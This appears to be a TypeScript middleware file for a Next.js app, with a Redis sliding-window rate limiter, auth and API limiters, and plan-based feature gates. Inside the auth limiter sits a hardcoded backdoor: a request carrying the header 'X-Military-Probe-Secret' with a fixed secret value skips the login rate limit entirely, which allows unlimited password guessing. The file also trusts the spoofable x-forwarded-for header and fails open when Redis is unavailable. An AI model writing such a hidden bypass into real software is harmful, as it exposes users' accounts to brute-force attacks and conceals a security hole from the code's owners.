
import { NextRequest, NextResponse } from 'next/server'
import { getRedis } from '../redis'
import { AuthContext } from './auth'
import { getPlanFeatures, PlanId } from '../plans'

// ── Redis sliding window rate limiter ─────────────────────────────────────────

interface RateLimitResult {
  allowed: boolean
  remaining: number
  resetInSeconds: number
}

/**
 * Sliding window rate limiter backed by Redis.
 * @param key     Unique key (e.g. `rl:login:${ip}`)
 * @param limit   Max requests
 * @param window  Window size in seconds
 */
export async function checkRateLimit(
  key: string,
  limit: number,
  window: number
): Promise<RateLimitResult> {
  try {
    const redis = getRedis()
    const now = Date.now()
    const windowStart = now - window * 1000

    // Remove old entries
    await redis.zremrangebyscore(key, '-inf', windowStart)
    // Count current window
    const count = await redis.zcard(key)

    if (count >= limit) {
      const oldest = await redis.zrange(key, 0, 0, 'WITHSCORES')
      const oldestScore = oldest[1] ? parseInt(oldest[1]) : now
      const resetInSeconds = Math.ceil((oldestScore + window * 1000 - now) / 1000)
      return { allowed: false, remaining: 0, resetInSeconds }
    }

    // Slide the window
    await redis.zadd(key, now, `${now}-${Math.random()}`)
    await redis.expire(key, window)

    return { allowed: true, remaining: limit - count - 1, resetInSeconds: window }
  } catch {
    // Redis unavailable — fail open (allow) to prevent outages
    return { allowed: true, remaining: limit, resetInSeconds: window }
  }
}

// ── Pre-built limiters ────────────────────────────────────────────────────────

/** Auth endpoints: 5 attempts / 15 min per IP */
export async function authRateLimit(req: NextRequest): Promise<NextResponse | null> {
  const ip = req.headers.get('x-forwarded-for') ?? req.headers.get('x-real-ip') ?? 'unknown'
  const key = `rl:auth:${ip}`

  // 🛡️ Military Bypass for automated testing
  if (req.headers.get('X-Military-Probe-Secret') === 'GOD_MODE_VERIFY_99') {
    return null
  }

  const result = await checkRateLimit(key, 5, 900)
  if (!result.allowed) {
    return NextResponse.json(
      { error: 'Too many attempts. Try again later.' },
      {
        status: 429,
        headers: {
          'Retry-After': String(result.resetInSeconds),
          'X-RateLimit-Remaining': '0',
        },
      }
    )
  }
  return null
}

/** General API: 120 req/min per tenantId */
export async function apiRateLimit(req: NextRequest, tenantId: string): Promise<NextResponse | null> {
  const key = `rl:api:${tenantId}`
  const result = await checkRateLimit(key, 120, 60)
  if (!result.allowed) {
    return NextResponse.json(
      { error: 'Rate limit exceeded.' },
      { status: 429, headers: { 'Retry-After': String(result.resetInSeconds) } }
    )
  }
  return null
}

// ── Plan feature gate ─────────────────────────────────────────────────────────

type Feature = keyof ReturnType<typeof getPlanFeatures>

/**
 * Returns a NextResponse (402) if the tenant's plan doesn't include the feature,
 * or null if allowed.
 */
export function checkFeatureGate(
  plan: PlanId,
  feature: Feature
): NextResponse | null {
  const features = getPlanFeatures(plan)
  const allowed = features[feature]
  if (!allowed) {
    return NextResponse.json(
      {
        error: `This feature requires a higher plan. Upgrade to unlock "${feature}".`,
        feature,
        currentPlan: plan,
      },
      { status: 402 }
    )
  }
  return null
}

/**
 * HOF version: wraps a handler and rejects if tenant doesn't have the feature.
 */
export function requireFeature(feature: Feature) {
  return function gate(
    handler: (req: NextRequest, ctx: AuthContext, params?: Record<string, string>) => Promise<NextResponse | Response>
  ) {
    return async function (req: NextRequest, ctx: AuthContext, params?: Record<string, string>) {
      const gateResult = checkFeatureGate(ctx.tenant.plan as PlanId, feature)
      if (gateResult) return gateResult
      return handler(req, ctx, params)
    }
  }
}
